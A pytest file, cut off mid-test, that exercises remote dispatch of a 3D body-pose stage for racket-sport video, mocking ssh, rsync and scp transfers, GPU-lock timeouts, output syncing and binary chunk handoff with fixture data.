from __future__ import annotations

import gzip
import json
import hashlib
import shutil
import shlex
import subprocess
import sys
import argparse
from pathlib import Path
from typing import Any

import pytest

from scripts.racketsport import remote_body_dispatch as rbd
from scripts.racketsport import run_sam3dbody_batch as batch
from threed.racketsport import orchestrator
from threed.racketsport.orchestrator import BodyStageRunner, StageContext
from threed.racketsport.schemas import BodyStagePhaseTiming, validate_artifact_file


def _completed(returncode: int, stdout: str = "", stderr: str = "") -> "subprocess.CompletedProcess[str]":
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr=stderr)


def _write_json(path: Path, payload: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


def _rsync_files_from_names(cmd: list[str]) -> list[str]:
    if "--files-from" not in cmd:
        return []
    files_from = Path(cmd[cmd.index("--files-from") + 1])
    return [line for line in files_from.read_text(encoding="utf-8").splitlines() if line]


def _is_rsync_download_batch(cmd: list[str]) -> bool:
    return cmd[0] == "rsync" and "--files-from" in cmd and ":" in cmd[-2] and ":" not in cmd[-1]


def _is_remote_output_listing(cmd: list[str]) -> bool:
    return cmd[0] == "ssh" and "BODY_OUTPUT_FILE_LIST" in cmd[-1]


def _tree_hashes(root: Path) -> dict[str, str]:
    return {
        str(path.relative_to(root)): hashlib.sha256(path.read_bytes()).hexdigest()
        for path in sorted(root.rglob("*"))
        if path.is_file()
    }


def _scp_remote_path(target: str) -> Path:
    return Path(target.split(":", 1)[1])


def _run_mocked_ssh_shell(command: str) -> "subprocess.CompletedProcess[str]":
    completed = subprocess.run(command, shell=True, check=False, capture_output=True, text=True)
    return subprocess.CompletedProcess(
        args=["ssh", command],
        returncode=completed.returncode,
        stdout=completed.stdout,
        stderr=completed.stderr,
    )


def _run_local_ssh_and_scp(command: list[str], timeout_s: float | None) -> "subprocess.CompletedProcess[str]":
    if command[0] == "ssh":
        # macOS test hosts do not provide GNU coreutils `timeout`; the real VM
        # does. Strip the wrapper in this local SSH fixture so the same remote
        # shell command can exercise the verifier and fake GPU lock script.
        return _run_mocked_ssh_shell(command[-1].replace("timeout 3600s ", ""))
    if command[0] == "scp":
        source, dest = command[-2], command[-1]
        if ":" in dest:
            remote_dest = _scp_remote_path(dest)
            remote_dest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source, remote_dest)
        else:
            local_dest = Path(dest)
            local_dest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(_scp_remote_path(source), local_dest)
        return _completed(0)
    raise AssertionError(f"unexpected command for local ssh/scp fixture: {command}")


def _git(repo: Path, *args: str) -> str:
    completed = subprocess.run(
        ["git", "-C", str(repo), *args],
        check=True,
        capture_output=True,
        text=True,
    )
    return completed.stdout.strip()


def _git_commit(repo: Path, message: str) -> str:
    subprocess.run(
        [
            "git",
            "-C",
            str(repo),
            "-c",
            "user.email=tests@example.invalid",
            "-c",
            "user.name=Tests",
            "commit",
            "-m",
            message,
        ],
        check=True,
        capture_output=True,
        text=True,
    )
    return _git(repo, "rev-parse", "HEAD")


def _write_fake_gpu_eval_lock(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        """#!/usr/bin/env bash
set -euo pipefail
runner="${2:?runner script path missing}"
run_dir="$(dirname "$runner")"
printf '{"event":"script_start","epoch_s":1001.25}\\n'
cat > "$run_dir/skeleton3d.json" <<'JSON'
{"schema_version":1,"artifact_type":"racketsport_skeleton3d","fps":30.0,"world_frame":"court_Z0","source_model":"sam3d_body_joints","joint_names":[],"players":[],"provenance":{"source":"fixture"}}
JSON
python - "$run_dir" <<'PY'
import json
import pathlib
import sys

run_dir = pathlib.Path(sys.argv[1])
stamp = json.loads((run_dir / "version_stamp.json").read_text(encoding="utf-8"))
remote = stamp.get("remote_verification") or {}
payload = {
    "schema_version": 1,
    "artifact_type": "racketsport_remote_sam3d_tier2_dispatch_config",
    "version_stamp": {
        "git_head_sha": stamp.get("git_head_sha"),
        "git_dirty": bool(stamp.get("git_dirty")),
        "allow_dirty": bool(stamp.get("allow_dirty")),
        "verified": bool(remote.get("verified")),
        "verified_at_utc": remote.get("verified_at_utc"),
        "remote_git_head_sha": remote.get("remote_git_head_sha"),
    },
}
(run_dir / "remote_sam3d_tier2_dispatch_config.json").write_text(json.dumps(payload), encoding="utf-8")
PY
exit 0
""",
        encoding="utf-8",
    )
    path.chmod(0o755)


def _version_fixture_repos(tmp_path: Path, *, stale_remote: bool) -> tuple[Path, Path]:
    local_repo = tmp_path / "local_repo"
    local_repo.mkdir()
    subprocess.run(["git", "-C", str(local_repo), "init", "-q"], check=True)
    dispatch_path = local_repo / "scripts" / "racketsport" / "remote_body_dispatch.py"
    dispatch_path.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(Path(rbd.__file__).resolve(), dispatch_path)
    _write_fake_gpu_eval_lock(local_repo / "scripts" / "gpu-eval-run.sh")
    _git(local_repo, "add", "scripts/racketsport/remote_body_dispatch.py", "scripts/gpu-eval-run.sh")
    _git_commit(local_repo, "base remote dispatch")

    if stale_remote:
        remote_repo = tmp_path / "remote_repo"
        subprocess.run(["git", "clone", "-q", str(local_repo), str(remote_repo)], check=True)
        dispatch_path.write_text(
            dispatch_path.read_text(encoding="utf-8") + "\n# local head fixture change\n",
            encoding="utf-8",
        )
        _git(local_repo, "add", "scripts/racketsport/remote_body_dispatch.py")
        _git_commit(local_repo, "advance local dispatch")
    else:
        dispatch_path.write_text(
            dispatch_path.read_text(encoding="utf-8") + "\n# local head fixture change\n",
            encoding="utf-8",
        )
        _git(local_repo, "add", "scripts/racketsport/remote_body_dispatch.py")
        _git_commit(local_repo, "advance local dispatch")
        remote_repo = tmp_path / "remote_repo"
        subprocess.run(["git", "clone", "-q", str(local_repo), str(remote_repo)], check=True)

    (remote_repo / "body_runtime" / "Fast-SAM-3D-Body").mkdir(parents=True, exist_ok=True)
    return local_repo, remote_repo


def _version_fixture_config(remote_repo: Path) -> rbd.RemoteConfig:
    return rbd.RemoteConfig(
        host="fixture@local",
        repo=str(remote_repo),
        python=sys.executable,
        fast_sam_python=sys.executable,
        fast_sam_root=str(remote_repo / "body_runtime" / "Fast-SAM-3D-Body"),
        known_hosts_file="",
        transport="tar_batch",
        transport_retry_max_attempts=1,
        transport_retry_backoff_s=0.0,
    )


def _patch_version_fixture_runtime(monkeypatch: pytest.MonkeyPatch, local_repo: Path) -> None:
    monkeypatch.setattr(rbd, "ROOT", local_repo)
    monkeypatch.setattr(
        rbd,
        "_remote_runtime_critical_files",
        lambda _repo_root=None: ("scripts/racketsport/remote_body_dispatch.py",),
        raising=False,
    )


def _clip_dir_with_tracks(tmp_path: Path) -> Path:
    clip_dir = tmp_path / "clip"
    clip_dir.mkdir()
    _write_json(clip_dir / "tracks.json", {"schema_version": 1, "fps": 30.0, "players": [], "rally_spans": []})
    (clip_dir / "source.mp4").write_bytes(b"not a real video")
    return clip_dir


def _body_dispatch_dir(tmp_path: Path, *, name: str) -> Path:
    dispatch_dir = tmp_path / name
    dispatch_dir.mkdir()
    _write_json(dispatch_dir / "court_calibration.json", _court_calibration_payload())
    _write_json(dispatch_dir / "tracks.json", _dispatch_tracks_payload())
    _write_json(dispatch_dir / "placement.json", _placement_payload())
    _write_json(dispatch_dir / "frame_compute_plan.json", _frame_compute_plan_payload())
    body_frames = dispatch_dir / "body_frames"
    body_frames.mkdir()
    (body_frames / "frame_000000.jpg").write_bytes(b"stub")
    return dispatch_dir


def _model_entry(model_id: str, stage: str, path: Path) -> dict[str, object]:
    return {
        "id": model_id,
        "stage": stage,
        "use": "test",
        "source": "test",
        "license": "test",
        "commercial_posture": "ok",
        "status": "available_on_h100",
        "local_path": str(path),
        "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
        "fallbacks": [],
    }


def _body_manifest(root: Path) -> Path:
    fast = root / "sam-3d-body-dinov3" / "model.ckpt"
    mhr = root / "sam-3d-body-dinov3" / "assets" / "mhr_model.pt"
    for path, body in ((fast, b"fast-sam-body"), (mhr, b"mhr-model")):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(body)
    manifest = root / "MANIFEST.json"
    _write_json(
        manifest,
        {
            "schema_version": 1,
            "models": [
                _model_entry("fast_sam_3d_body_dinov3", "3d_body_backbone", fast),
                _model_entry("sam_3d_body_mhr_model", "3d_body_backbone", mhr),
            ],
        },
    )
    return manifest


def _court_calibration_payload() -> dict[str, object]:
    return {
        "schema_version": 1,
        "sport": "pickleball",
        "homography": [[100.0, 0.0, 1000.0], [0.0, 100.0, 1000.0], [0.0, 0.0, 1.0]],
        "intrinsics": {"fx": 1000.0, "fy": 1000.0, "cx": 960.0, "cy": 540.0, "dist": [], "source": "manual"},
        "extrinsics": {
            "R": [[1.0, 0.0, 0.0], [0.0, 1.0, 0.0], [0.0, 0.0, 1.0]],
            "t": [0.0, 0.0, 0.0],
            "camera_height_m": 1.5,
        },
        "reprojection_error_px": {"median": 1.0, "p95": 2.0},
        "capture_quality": {"grade": "good", "reasons": []},
        "image_pts": [[756.8, 88.4896], [1163.2, 88.4896], [1163.2, 991.5104], [756.8, 991.5104]],
        "world_pts": [[-3.048, -6.7056, 0.0], [3.048, -6.7056, 0.0], [3.048, 6.7056, 0.0], [-3.048, 6.7056, 0.0]],
    }


def _dispatch_tracks_payload() -> dict[str, object]:
    return {
        "schema_version": 1,
        "fps": 30.0,
        "placement_provenance": {"stage": "placement", "stance_phase_count": 1},
        "players": [
            {
                "id": 7,
                "side": "near",
                "role": "left",
                "frames": [{"t": 0.0, "bbox": [940.0, 440.0, 980.0, 540.0], "world_xy": [0.25, 0.5], "conf": 0.91}],
            }
        ],
        "rally_spans": [],
    }


def _placement_payload() -> dict[str, object]:
    return {
        "schema_version": 1,
        "artifact_type": "racketsport_placement",
        "fps": 30.0,
        "source": "unit-test",
        "tracks_path": "tracks.json",
        "backup_tracks_path": "tracks_prewrite_backup.json",
        "refine_from_sam3d": False,
        "undistort_applied": False,
        "players": [
            {
                "id": 7,
                "frames": [
                    {
                        "frame_idx": 0,
                        "t": 0.0,
                        "original_world_xy": [0.25, 0.5],
                        "fused_world_xy": [0.25, 0.5],
                        "smoothed_world_xy": [0.25, 0.5],
                        "covariance_m2": [[0.01, 0.0], [0.0, 0.01]],
                        "stance": True,
                        "signals": [],
                        "source_counts": {"bbox": 1},
                    }
                ],
            }
        ],
        "summary": {
            "player_count": 1,
            "frame_count": 1,
            "coverage_unchanged": True,
            "source_counts": {"bbox": 1},
            "jitter_before_after_mps": {},
            "stance_wobble_before_after_m": {},
            "court_bounds_violations": 0,
        },
        "provenance": {"stage": "placement", "stance_phase_count": 1},
    }


def _frame_compute_plan_payload() -> dict[str, object]:
    return {
        "schema_version": 1,
        "artifact_type": "racketsport_frame_compute_plan",
        "fps": 30.0,
        "expected_players": 1,
        "frame_count": 1,
        "frames": [
            {
                "frame_idx": 0,
                "t": 0.0,
                "score": 0.75,
                "recommended_tier": "deep_mesh",
                "target_representation": "world_mesh",
                "reasons": ["contact_window"],
                "active_players": 1,
                "active_player_ids": [7],
                "missing_players": 0,
                "min_track_conf": 0.91,
                "ball_conf": None,
                "player_targets": [
                    {
                        "player_id": 7,
                        "track_conf": 0.91,
                        "score": 0.75,
                        "recommended_tier": "deep_mesh",
                        "target_representation": "world_mesh",
                        "reasons": ["contact_window"],
                    }
                ],
            }
        ],
        "deep_mesh_windows": [
            {
                "frame_start": 0,
                "frame_end": 0,
                "t0": 0.0,
                "t1": 1.0 / 30.0,
                "frame_count": 1,
                "target_representation": "world_mesh",
                "fallback_representation": "skeleton_preview",
                "target_player_ids": [7],
                "reason_counts": {"contact_window": 1},
                "max_score": 0.75,
            }
        ],
        "summary": {
            "by_tier": {"deep_mesh": 1},
            "by_reason": {"contact_window": 1},
            "by_player_target_representation": {"world_mesh": 1},
            "max_score": 0.75,
            "deep_mesh_window_count": 1,
            "deep_mesh_frame_count": 1,
            "human_review_frame_count": 0,
        },
    }


def _sam3d_skeleton_payload() -> dict[str, object]:
    return {
        "schema_version": 1,
        "artifact_type": "racketsport_skeleton3d",
        "fps": 30.0,
        "world_frame": "court_Z0",
        "source_model": "sam3d_body_joints",
        "joint_names": [f"sam3dbody_joint_{idx:03d}" for idx in range(70)],
        "preview_only": False,
        "players": [],
        "provenance": {"source": "sam3d_body_joints"},
    }


class _FakeFastSamRuntime:
    def process_frame(self, image_path: Path, *, bboxes_xyxy: list[list[float]], **_kwargs: object) -> list[dict[str, object]]:
        joints = [[0.02 * idx, 0.0, 0.2 + 0.05 * (idx % 12)] for idx in range(70)]
        joints[41] = [0.41, 0.0, 1.3]
        joints[62] = [0.62, 0.0, 1.4]
        return [
            {
                "bbox": bboxes_xyxy[0],
                "global_rot": [0.01, 0.02, 0.03],
                "body_pose_params": [0.1] * 63,
                "hand_pose_params": [0.2] * 108,
                "shape_params": [0.0] * 10,
                "pred_cam_t": [0.0, 0.0, 10.0],
                "pred_vertices": [[0.0, 0.0, 0.1], [0.1, 0.0, 1.7], [0.1, 0.2, 0.9]],
                "mesh_faces": [[0, 1, 2]],
                "pred_keypoints_3d": joints,
                "confidence": 0.86,
            }
        ]


class _FakeBatchFastSamRuntime(_FakeFastSamRuntime):
    def __init__(self, work_dir: Path) -> None:
        self.work_dir = work_dir

    def process_frame_batches(self, requests: list[dict[str, object]], **_kwargs: object) -> list[list[dict[str, object]]]:
        self.work_dir.mkdir(parents=True, exist_ok=True)
        timing_payload = {
            "schema_version": 1,
            "artifact_type": "racketsport_sam3dbody_batch_timing",
            "total_s": 10.0,
            "request_parse_s": 0.1,
            "model_setup_load_s": 2.0,
            "compile_warmup_s": 1.5,
            "steady_inference_s": 3.0,
            "person_frame_count": len(requests),
            "ms_per_person_steady": 3000.0 / max(1, len(requests)),
            "crop_bucket_tensor_prep_s": 0.5,
            "preprocessing_s": 0.5,
            "postprocessing_s": 0.25,
            "result_serialization_handoff_s": 0.75,
            "attributed_s": 8.1,
            "other_s": 1.9,
            "per_bucket": [{"bucket_size": 8, "warmup_s": 1.5, "steady_s": 3.0, "frames": len(requests)}],
        }
        _write_json(self.work_dir / "batch_outputs-unit.json.timing.json", timing_payload)
        outputs: list[list[dict[str, object]]] = []
        for request in requests:
            outputs.append(
                self.process_frame(
                    Path(request["image_path"]),
                    bboxes_xyxy=request["bboxes"],  # type: ignore[arg-type]
                )
            )
        return outputs


class _FakeSubprocessRuntimeForBinary:
    def __init__(self, work_dir: Path) -> None:
        self.python_executable = Path(sys.executable)
        self.fast_sam_repo = Path("/tmp/fast-sam")
        self.checkpoint_dir = Path("/tmp/checkpoints")
        self.detector_name = ""
        self.detector_model = ""
        self.fov_name = ""
        self.body_input_size_px = 384
        self.work_dir = work_dir
        self.fallback_calls: list[dict[str, Any]] = []

    def process_frame_batches(self, requests: list[Any], **kwargs: Any) -> list[list[dict[str, Any]]]:
        self.fallback_calls.append({"requests": requests, "kwargs": kwargs})
        return [[{"pred_vertices": [[9.0, 0.0, 0.0]], "pred_keypoints_3d": [[0.0, 0.0, 1.0]]}]]


def test_binary_handoff_subprocess_runtime_loads_sidecar_arrays(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    import numpy as np

    runtime = _FakeSubprocessRuntimeForBinary(tmp_path / "work")
    wrapper = orchestrator._BinaryHandoffSubprocessRuntime(runtime)  # type: ignore[arg-type]

    def fake_run(cmd: list[str], **_kwargs: Any) -> subprocess.CompletedProcess[str]:
        assert "--chunk-format" in cmd
        # pickle is the dispatch default since the 2026-07-05 live A100 measurement
        # showed the .npy transport regressing BODY 1057->1301s; chunk loading stays
        # format-agnostic (chunks self-describe), which is what this test proves.
        assert cmd[cmd.index("--chunk-format") + 1] == "pickle"
        assert "--no-monolithic-output" in cmd
        out_path = Path(cmd[cmd.index("--out") + 1])
        chunk_dir = out_path.with_name(f"{out_path.name}.chunks")
        array_dir = chunk_dir / "bucket_000000.binary" / "arrays"
        array_dir.mkdir(parents=True)
        np.save(array_dir / "pred_vertices_000000.npy", np.asarray([[1.0, 2.0, 0.3]], dtype=np.float32), allow_pickle=False)
        chunk = {
            "schema_version": 1,
            "artifact_type": batch.SAM3D_BATCH_BINARY_CHUNK_ARTIFACT_TYPE,
            "contract_version": batch.SAM3D_BATCH_BINARY_CONTRACT_VERSION,
            "array_encoding": "npy_per_bulk_field",
            "frames": [
                {
                    "request_id": "0:7",
                    "records": [
                        {
                            "pred_vertices": {
                                batch.SAM3D_ARRAY_REF_KEY: {
                                    "path": "arrays/pred_vertices_000000.npy",
                                    "dtype": "float32",
                                    "shape": [1, 3],
                                }
                            },
                            "confidence": 0.75,
                        }
                    ],
                }
            ],
        }
        (chunk_dir / "bucket_000000.binary.json").write_text(json.dumps(chunk), encoding="utf-8")
        index = {
            "schema_version": 1,
            "artifact_type": "racketsport_sam3dbody_batch_chunk_index",
            "status": "complete",
            "request_count": 1,
            "result_count": 1,
            "request_ids": ["0:7"],
            "chunks": [{"bucket_index": 0, "path": "bucket_000000.binary.json", "format": "binary", "request_ids": ["0:7"]}],
            "batch_execution": {},
            "monolithic_template": None,
            "error": None,
        }
        (chunk_dir / "index.json").write_text(json.dumps(index), encoding="utf-8")
        return _completed(0)

    monkeypatch.setattr(orchestrator.subprocess, "run", fake_run)

    outputs = wrapper.process_frame_batches(
        [{"request_id": "0:7", "image_path": tmp_path / "frame.jpg", "bboxes": [[1.0, 2.0, 3.0, 4.0]]}],
        crop_bucket_sizes=(1,),
    )

    np.testing.assert_allclose(outputs[0][0]["pred_vertices"], np.asarray([[1.0, 2.0, 0.3]], dtype=np.float32))
    assert outputs[0][0]["confidence"] == 0.75
    assert wrapper.binary_handoff_status == "pickle_chunks_v1"
    assert "pickle chunks" in wrapper.binary_handoff_note
    assert runtime.fallback_calls == []


def test_binary_handoff_subprocess_runtime_falls_back_on_old_runner_flags(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    runtime = _FakeSubprocessRuntimeForBinary(tmp_path / "work")
    wrapper = orchestrator._BinaryHandoffSubprocessRuntime(runtime)  # type: ignore[arg-type]

    def fake_run(_cmd: list[str], **_kwargs: Any) -> subprocess.CompletedProcess[str]:
        return _completed(2, stderr="error: unrecognized arguments: --chunk-format binary --no-monolithic-output")

    monkeypatch.setattr(orchestrator.subprocess, "run", fake_run)

    outputs = wrapper.process_frame_batches(
        [{"request_id": "0:7", "image_path": tmp_path / "frame.jpg", "bboxes": [[1.0, 2.0, 3.0, 4.0]]}],
        crop_bucket_sizes=(1,),
    )

    assert outputs == [[{"pred_vertices": [[9.0, 0.0, 0.0]], "pred_keypoints_3d": [[0.0, 0.0, 1.0]]}]]
    assert wrapper.binary_handoff_status == "legacy_fallback"
    assert "runner does not support binary sidecar flags" in wrapper.binary_handoff_note
    assert len(runtime.fallback_calls) == 1


def test_check_remote_reachable_true_on_zero_exit() -> None:
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _completed(0)

    assert rbd.check_remote_reachable(rbd.RemoteConfig(), run=fake_run) is True
    assert calls[0][0] == "ssh"


def test_check_remote_reachable_false_on_timeout() -> None:
    def fake_run(cmd, timeout_s):  # noqa: ANN001
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=timeout_s or 1)

    assert rbd.check_remote_reachable(rbd.RemoteConfig(), run=fake_run) is False


def test_dispatch_body_stage_raises_when_unreachable(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        return _completed(255, stderr="Connection refused")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="unreachable"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=rbd.RemoteConfig(transport="rsync"),
            allow_dirty=True,
            run=fake_run,
        )


def test_dispatch_body_stage_raises_without_local_tracks(tmp_path: Path) -> None:
    empty_clip_dir = tmp_path / "empty_clip"
    empty_clip_dir.mkdir()
    (empty_clip_dir / "source.mp4").write_bytes(b"x")

    call_sequence: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            call_sequence.append("reachable")
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            call_sequence.append("preflight")
            return _completed(0)
        if cmd[0] == "ssh":
            call_sequence.append("mkdir")
            return _completed(0)
        raise AssertionError(f"unexpected command before rsync guard: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="tracks.json"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=empty_clip_dir,
            video_path=empty_clip_dir / "source.mp4",
            allow_dirty=True,
            run=fake_run,
        )
    assert call_sequence == ["reachable", "preflight", "mkdir"]


def test_dispatch_body_stage_reports_lock_busy_on_gpu_lock_wait_exit_code(tmp_path: Path) -> None:
    """Task #46 timeout split: exit 75 is scripts/gpu-eval-run.sh's own
    GPU_LOCK_TIMEOUT_S flock timeout -- the shared lock was genuinely busy."""

    clip_dir = _clip_dir_with_tracks(tmp_path)
    steps: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            return _completed(0)
        if cmd[0] == "rsync":
            steps.append("rsync_up")
            return _completed(0)
        if cmd[0] == "ssh":
            steps.append("remote_command")
            return _completed(75, stdout="gpu-eval-run: timed out after 60s waiting for full-gpu.lock")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="lock busy"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=rbd.RemoteConfig(transport="rsync"),
            allow_dirty=True,
            run=fake_run,
        )
    assert "remote_command" in steps


def test_dispatch_body_stage_reports_command_budget_exceeded_on_timeout_exit_code(tmp_path: Path) -> None:
    """Task #46 timeout split: exit 124 now means the *overall* remote BODY run
    exceeded command_timeout_s -- it must NOT be misreported as "lock busy"
    (the old behavior, which SIGKILLed any real >60s BODY run mid-inference)."""

    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and (cmd[-1] == "true" or cmd[-1].startswith(("test -e", "mkdir"))):
            return _completed(0)
        if cmd[0] == "rsync":
            return _completed(0)
        if cmd[0] == "ssh":
            return _completed(124, stdout="")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError) as exc_info:
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=rbd.RemoteConfig(transport="rsync"),
            allow_dirty=True,
            run=fake_run,
        )
    message = str(exc_info.value)
    assert "command budget" in message
    assert "lock busy" not in message


def test_dispatch_body_stage_bounds_local_ssh_wait_and_reports_hang(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    seen_timeouts: list[float | None] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and (cmd[-1] == "true" or cmd[-1].startswith(("test -e", "mkdir"))):
            return _completed(0)
        if cmd[0] == "rsync":
            return _completed(0)
        if cmd[0] == "ssh":
            seen_timeouts.append(timeout_s)
            raise subprocess.TimeoutExpired(cmd=cmd, timeout=timeout_s or 1)
        raise AssertionError(f"unexpected command: {cmd}")

    config = rbd.RemoteConfig(command_timeout_s=300, transport="rsync")
    with pytest.raises(rbd.RemoteBodyDispatchError, match="no result within"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=config,
            allow_dirty=True,
            run=fake_run,
        )
    # the local subprocess guard sits slightly above the remote-side budget.
    assert seen_timeouts == [420]


def test_dispatch_body_stage_success_syncs_outputs_back(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    remote_marker: dict[str, str] = {}

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            return _completed(0)
        if _is_remote_output_listing(list(cmd)):
            return _completed(0, stdout="smpl_motion.json\n")
        if cmd[0] == "rsync":
            src, dst = cmd[-2], cmd[-1]
            if dst.startswith(str(rbd.DEFAULT_REMOTE_HOST)) or ":" in dst:
                # rsync "up": local -> remote (dst contains host:path)
                for name in _rsync_files_from_names(list(cmd)) or [Path(src).name if Path(src).exists() else src]:
                    remote_marker[name] = "uploaded"
            else:
                # rsync "down": remote -> local; simulate the remote producing smpl_motion.json
                if _is_rsync_download_batch(list(cmd)) and "smpl_motion.json" in _rsync_files_from_names(list(cmd)):
                    _write_json(Path(dst) / "smpl_motion.json", {"schema_version": 1, "model": "sam3dbody_world_joints", "fps": 30.0, "world_frame": "court_Z0", "players": []})
                    return _completed(0)
                return _completed(1, stderr="not found")
            return _completed(0)
        if cmd[0] == "ssh":
            return _completed(0, stdout="body stage ok")
        raise AssertionError(f"unexpected command: {cmd}")

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        config=rbd.RemoteConfig(fetch_body_monoliths=True, transport="rsync"),
        allow_dirty=True,
        run=fake_run,
    )
    assert result.status == "ran"
    assert "smpl_motion.json" in result.synced_outputs
    assert (clip_dir / "smpl_motion.json").is_file()


def test_remote_body_outputs_cannot_overwrite_local_calibration_or_world_bundle() -> None:
    assert "court_calibration.json" not in rbd.BODY_OUTPUT_ARTIFACTS
    assert "court_zones.json" not in rbd.BODY_OUTPUT_ARTIFACTS
    assert "net_plane.json" not in rbd.BODY_OUTPUT_ARTIFACTS
    assert "virtual_world.json" not in rbd.BODY_OUTPUT_ARTIFACTS


def test_rsync_down_excludes_heavy_body_monoliths_by_default(tmp_path: Path) -> None:
    clip_dir = tmp_path / "clip"
    attempted: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        command = list(cmd)
        if _is_remote_output_listing(command):
            return _completed(0, stdout="skeleton3d.json\nbody_serialization_timing.json\nbody_stage_phase_timing.json\n")
        if _is_rsync_download_batch(command):
            names = _rsync_files_from_names(command)
            attempted.extend(names)
            for name in names:
                _write_json(Path(command[-1]) / name, {"artifact_type": name})
            return _completed(0)
        src = command[-2]
        attempted.append(src.rsplit("/", 1)[-1])
        return _completed(1, stderr="not found")

    synced = rbd._rsync_down("/remote/run", clip_dir, rbd.RemoteConfig(), run=fake_run)

    assert "skeleton3d.json" in synced
    assert "smpl_motion.json" not in attempted
    assert "body_mesh.json" not in attempted
    assert "body_serialization_timing.json" in attempted
    assert "body_stage_phase_timing.json" in attempted


def test_rsync_down_fetches_heavy_body_monoliths_when_requested(tmp_path: Path) -> None:
    clip_dir = tmp_path / "clip"
    downloaded: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        command = list(cmd)
        if _is_remote_output_listing(command):
            return _completed(0, stdout="smpl_motion.json\nbody_mesh.json\n")
        if _is_rsync_download_batch(command):
            names = _rsync_files_from_names(command)
            downloaded.extend(names)
            for name in names:
                _write_json(Path(command[-1]) / name, {"artifact_type": name})
            return _completed(0)
        return _completed(1, stderr="not found")

    synced = rbd._rsync_down(
        "/remote/run",
        clip_dir,
        rbd.RemoteConfig(fetch_body_monoliths=True),
        run=fake_run,
    )

    assert "smpl_motion.json" in downloaded
    assert "body_mesh.json" in downloaded
    assert "smpl_motion.json" in synced
    assert "body_mesh.json" in synced


def test_rsync_down_batches_existing_single_files_and_tolerates_missing_outputs(tmp_path: Path) -> None:
    clip_dir = tmp_path / "clip"
    commands: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        command = list(cmd)
        commands.append(command)
        if _is_remote_output_listing(command):
            assert "smpl_motion.json" not in command[-1]
            return _completed(0, stdout="skeleton3d.json\nbody_stage_phase_timing.json\n")
        if _is_rsync_download_batch(command):
            assert _rsync_files_from_names(command) == ["skeleton3d.json", "body_stage_phase_timing.json"]
            _write_json(Path(command[-1]) / "skeleton3d.json", {"artifact_type": "racketsport_skeleton3d"})
            return _completed(23, stderr="vanished file: body_stage_phase_timing.json: No such file or directory")
        return _completed(1, stderr="not found")

    synced = rbd._rsync_down("/remote/run", clip_dir, rbd.RemoteConfig(), run=fake_run)

    assert synced == ["skeleton3d.json"]
    ssh_commands = [cmd for cmd in commands if cmd[0] == "ssh"]
    rsync_commands = [cmd for cmd in commands if cmd[0] == "rsync"]
    assert len(ssh_commands) == 1
    assert len([cmd for cmd in rsync_commands if "--files-from" in cmd]) == 1


def test_rsync_down_fetches_body_mesh_index_directory_when_present(tmp_path: Path) -> None:
    clip_dir = tmp_path / "clip"
    directory_downloads: list[tuple[str, str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        src, dst = cmd[-2], cmd[-1]
        if _is_remote_output_listing(list(cmd)):
            return _completed(0, stdout="")
        if src.endswith("/body_mesh_index/"):
            directory_downloads.append((src, dst))
            index_dir = Path(dst)
            index_dir.mkdir(parents=True, exist_ok=True)
            _write_json(index_dir / "body_mesh_index.json", {"artifact_type": "racketsport_body_mesh_index"})
            return _completed(0)
        return _completed(1, stderr="not found")

    synced = rbd._rsync_down("/remote/run", clip_dir, rbd.RemoteConfig(), run=fake_run)

    assert directory_downloads == [
        (f"{rbd.DEFAULT_REMOTE_HOST}:/remote/run/body_mesh_index/", str(clip_dir / "body_mesh_index/"))
